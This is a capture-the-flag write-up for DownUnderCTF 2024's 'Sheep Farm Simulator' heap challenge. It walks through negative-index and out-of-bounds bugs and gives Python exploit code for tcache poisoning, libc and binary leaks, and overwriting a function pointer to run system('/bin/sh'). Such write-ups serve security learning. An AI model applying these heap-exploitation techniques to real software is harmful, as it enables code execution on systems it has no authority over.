# DownUnderCTF 2024 - Sheep Farm Simulator

**Summary**: Exploiting unchecked negative indexes into an array on the heap to corrupt tcache chunks and get bit-by-bit arbitrary read/write. Then, overwriting a function pointer used by the program to call `system("/bin/sh")` instead.

## Intro

We have a program that lets us allocate/free 0x20-sized heap chunks, view one of those chunks, and another operation called `upgrade` that will change the values inside that chunk. What is interesting about the `upgrade_sheep` operation is that because it lets us either do `sheep->wps *= 2` or `sheep->wps += 1` each time, we can construct any arbitrary value into `sheep->wps` bit-by-bit by repeating this operation. This will be useful later.

## Vulnerabilities

The first vulnerability is in the checks for `idx` in upgrade, sell, and view functions:

```C
    int idx = read_int("index> ");
    if(idx >= SHEEP_MAX || game->sheep[idx] == NULL) {
        puts("That sheep doesn't exist!");
        return;
    }
```

This never checks that `idx` is not negative, and `idx` is a signed int, so it is possible to give it negative indexes. The heap layout is like this:

```
----- start of the heap ------
[tcache data (including tcachebins head entries)]
[game]
[sheep]
[sheep]
...
[sheep]
[top_chunk]
----- end of the heap ------
```

and the `game->sheep` array is in the `game` struct, so by giving it negative indexes, we can either index something in the fields of `game_t` that are before the `sheep` array, or we can index something in the tcache data chunk.

The second vulnerability is that in `buy_sheep`, we never check if `game->free_slot_hint` goes out of bounds:

```C
    while(game->sheep[game->free_slot_hint]) game->free_slot_hint++;
    game->sheep[game->free_slot_hint] = sheep;
```

This means the pointer to an allocated sheep might be written after the `game->sheep` array, i.e. in one of the sheep chunks!

## Exploitation
### 1. Getting a heap leak and infinite money

We can use the second vulnerability to write the 64-bit pointer to one of the sheep chunks in the `value` field of the first sheep chunk after `game`. Now by calling `view` on the first sheep chunk we can get a heap leak, and then by selling it we can increase `game->wool` by a 64-bit pointer and effectively get infinite money. The infinite money is needed later to perform upgrades without running out of money!

```python
for i in range(20):
	buy(0)
for i in range(6, -1, -1):
	sell(i)
sell(19)	# move free_slot_hint to index 19
leak_idx = buy(0)
buy(0)	# the next pointer into game->sheep will be written out of bounds and into the sheep->value field of the first sheep chunk
heap_leak = int(view(leak_idx)[1])
heap_base = heap_leak - 0x380
log.success("heap base = " + hex(heap_base))
sell(19)	# sell the sheep whose 'value' is a 64-bit heap leak pointer to get rich! (with game->wool)
```

### 2. Arbitrary read/write

To get arbitrary write, I noticed that whatever address is written at the tcache head entry of the 0x20 tcachebin can be seen as a sheep by the program by giving the index -69 to the `game->sheep` array in the functions. As said before, we can call `upgrade_sheep()` on any sheep to construct an arbitrary value into its `wps` field bit-by-bit. If the value at the tcache head is a freed tcache chunk, its `sheep->wps` will basically be its `chunk->fd` pointer! So, we can change the `fd` pointer of the chunk at the head of tcache. If we then call `malloc` to allocated that chunk, whatever we wrote into its `fd` will be moved into the tcache head. Now, we can see the arbitrary value written into tcache head as the address of another sheep and construct an arbitrary value into its `wps` as well! This means if we write an arbitrary address at the `fd` pointer of the tcache chunk, we can get that address to be the next tcache head, and we can write any arbitrary value into that arbitrary address! (and we can alternatively call `view_sheep` on that address to do an arbitrary read on it). We can then free the chunk that we just allocated again to return the heap to its previous state! This gives us a stable and repeatable arbitrary read/write primitive.

```python
TCACHE_IDX = -69	# and index into game->sheep that will point to the 0x20-sized tcache head entry

for i in range(6):	# buy some more sheep with OOB indexes to increase game->num_sheep without filling game->sheep entries
	buy(0)

for i in range(18, 6, -1):	# sell all sheep to fill the tcachebin and also add the rest to the fastbins.
	sell(i)					# also, moves free_slot_hint to index 6 at the end of the loop.

# this sheep will be allocated at index 7, and we'll overwrite the fd pointer
# of its tcache chunk later to get arbitrary values into the tcache head.
# Also, this will be allocated from tcache, so the tcache count after this will be 6.
ARB_RW_SHEEP_IDX = buy(0)

# find the largest suffix of the binary representation of 'cur' that is also a prefix of 'val'
# used to know how many bits we don't need to re-write when constructing values bit-by-bit in bitwise_build().
# This is just an optimization to reduce interactions with the server and prevent timing out.
def shared_suffix_prefix(cur, val):
	for i in range(64, 0, -1):
		cur_suf = cur & ((1 << i) - 1)
		val_pref = (val >> (64 - i)) & ((1 << i) - 1)
		if (cur_suf == val_pref):
			print("suf:", i)
			return i
	print("suf:", 0)
	return 0

# use upgrade_sheep() to construct an arbitrary value into the 'wps' field of a sheep at index 'idx'
def bitwise_build(idx, value, buffer=False):
	if buffer:
		prefix_size = 0
	else:
		current = view(idx)[0]	# if acting unbuffered, we can view the current value at 'idx' and not re-write unnecessary bits
		prefix_size = shared_suffix_prefix(current, value)
	for i in range(63 - prefix_size, -1, -1):
		if ((value >> i) & 1):
			# print("i =", i, " --> *2+1")
			upgrade(idx, 2, buffer=buffer)
			upgrade(idx, 1, buffer=buffer)
		else:
			# print("i =", i, " --> *2")
			upgrade(idx, 2, buffer=buffer)

# arbitrary write primitive
def arb_write(addr, value, buffer=False):
	sell(ARB_RW_SHEEP_IDX, buffer=buffer)	# create a new free'd tcache chunk and write its address at the head of 0x20 tcache
	bitwise_build(TCACHE_IDX, addr ^ (heap_base >> 12), buffer=buffer)	# write 'addr' (with heap PROTECT_PTR) into fd of the free chunk
	buy(0, buffer=buffer)	# allocated the chunk again to get 'addr' into the head of tcache
	bitwise_build(TCACHE_IDX, value, buffer=buffer)	# write 'value' into the sheep->wps of the sheep whose address is at the tcache head (i.e. the sheep with address 'addr')

# arb read primitive; similar implementation to arb_write
def arb_read(addr):
	sell(ARB_RW_SHEEP_IDX)	# free a tcache chunk into the head of tcache
	bitwise_build(TCACHE_IDX, addr ^ (heap_base >> 12))	# write 'addr' into the fd of the freed chunk
	buy(0)	# allocate the chunk again to get 'addr' into the head of tcache
	return view(TCACHE_IDX)	# view the wps of the sheep at address 'addr'
```

However, because we're building the arbitrary values bit-by-bit, it takes quite a long time on the remote. I added the `shared_suffix_prefix` as a small optimization to this, and then I used input buffering at some point later to speed up the process (more on that later).

### 3. Libc and binary base leaks

In order to leak libc, we can create metadata for a fake chunk on the heap that is large enough to not fit in tcache. Then, by writing the address of this chunk somewhere before `game->sheep` and `sell`ing it, we can free the large chunk. The large chunk will go into the unsorted bin and two libc pointers pointing to the unsorted bin head will be written in the `fd` and `bk` of the freed fake chunk on the heap.

Then, I searched libc address range for pointers pointing to the program binary, and found a reliable leak to find the elf base in libc. We can use the arbitrary read primitive to read that.

```python
# write a large chunk size onto the heap that we can free.
# This chunk should not fit into tcache so that it goes into the unsorted bin and we get a libc leak.
fake_chunk = heap_base + 0xb8
arb_write(fake_chunk, 0x501)	# fake chunk-size
arb_write(heap_base + 0x280, fake_chunk + 8)	# write the address of the chunk userdata on the heap
sell(-7)	# free the fake chunk

libc.address = arb_read(fake_chunk + 8)[0] - 0x21ace0	# leak unsorted bin pointer from the freed fake chunk
log.success("libc base = " + hex(libc.address))
elf.address = arb_read(libc.address + 0x219e38)[0] - 0x40c0	# leak binary base by reading it from libc memory
log.success("elf base = " + hex(elf.address))
```

### 4. Getting RCE

One issue in getting RCE is that the arbitrary write primitive works bit-by-bit, so it will take many iterations of the program loop to get our desired value into some address, and the value at that address will be corrupted in the period before the arbitrary write ends. This makes it a bit more difficult to get RCE, as writing into a function pointer that will be invoked every time will cause it to segfault before the arbitrary write finishes. Instead, the program itself has some logic with function pointers that will be useful here. Each `sheep` instance has an index `ability_index` into the global `abilities` array of function pointers. Each round each sheep that has an index between 0 and `game->num_sheep` will get its corresponding ability function called and the `sheep` object itself is passed as an argument to it. If we can have a condition where at least one of the ability functions is never called, and then overwrite that function pointer with `system`, then we can buy a new sheep that has that ability and get RCE. Because we already sold all but one sheep that are in the `game->sheep` array, and because we allocated 6 sheep whose pointers were written OOB after the sheep array, now we are left with a situation that all entries of `game->sheep` are empty except index 7 (which is the sheep we use for arbitrary read/write) and 19, but `game->num_sheep` is 7. So, we can overwrite the ability function of sheep #7 without getting a segfault, and then as soon as we buy just one more sheep to increase `num_sheep` by 1, the ability of sheep #7 will be called and we'll get RCE.

By breaking in gdb at this point we can see that the ability index of sheep #7 is 2, and because the RNG is constant seeded, this is deterministic and the same every time. We can just overwrite `abilities[2]` with `system`. Also, since sheep #7 is passed to the ability function as an argument, we can write the string `"/bin/sh"` on the heap in the beginning of sheep #7.

The only issue is that because our arbitrary write uses the tcache, it will leave the target address of our arbitrary write in the tcache head after it completes. After writing "/bin/sh" into sheep #7, when we want to buy another sheep to trigger sheep 7's ability function, the new sheep will be allocated from tcache which still has sheep #7's address, and the new allocation will be at the same location as sheep #7 and overwrite the "/bin/sh" string.

To fix this, I sold the sheep left at index 19, overwrote its `fd` pointer with a pointer to an empty area on the heap using the same strategy as before, and allocated it again to get that pointer into the tcache head instead. Then, doing one more `buy` operation will set `game->num_sheep` to 8 and trigger `system("/bin/sh")`.


### 5. Final optimization

This exploit worked locally, but timed out on the remote because of the large number of interactions required with the server (since all arb read/write operations are bit-by-bit). To fix this, I realized that after getting the libc and binary base leaks, the rest of the payload is deterministic and doesn't really depend on the server responses, so I added a "buffered" mode to the interaction functions I used to write the payload into `pbuf` instead of doing `p.sendlineafter` every time. After the whole payload is complete, I just did `p.send(pbuf)`. This sped up the interactions and didn't time out.

```python
arb_write(elf.sym["abilities"] + 0x10, libc.sym["system"], buffer=True)	# write system() into 'abilities[2]'
arb_write(heap_base + 0x4e0, u64(b"/bin/sh\0"), buffer=True)	# write "/bin/sh" into a sheep chunk that now has ability 2
# game->num_sheep is less than the index of the sheep at heap_base+0x4e0, so system("/bin/sh") won't yet be triggered

# change tcache head value to prevent next allocations from overwriting "/bin/sh" string
sell(19, buffer=True)
bitwise_build(TCACHE_IDX, (heap_base + 0x1000) ^ (heap_base >> 12), buffer=True)

# buy new sheep to increase game->num_sheep and trigger the sheep with ability #2 (now system("/bin/sh"))
buy(0, buffer=True)
buy(0, buffer=True)

p.send(pbuf)	# send buffered payload

p.interactive()
```

Flag: `DUCTF{y0u_ar3_the_gre4t3st_sheph3rd!!}`

Full exploit code can be seen in the `exploit.py` file.
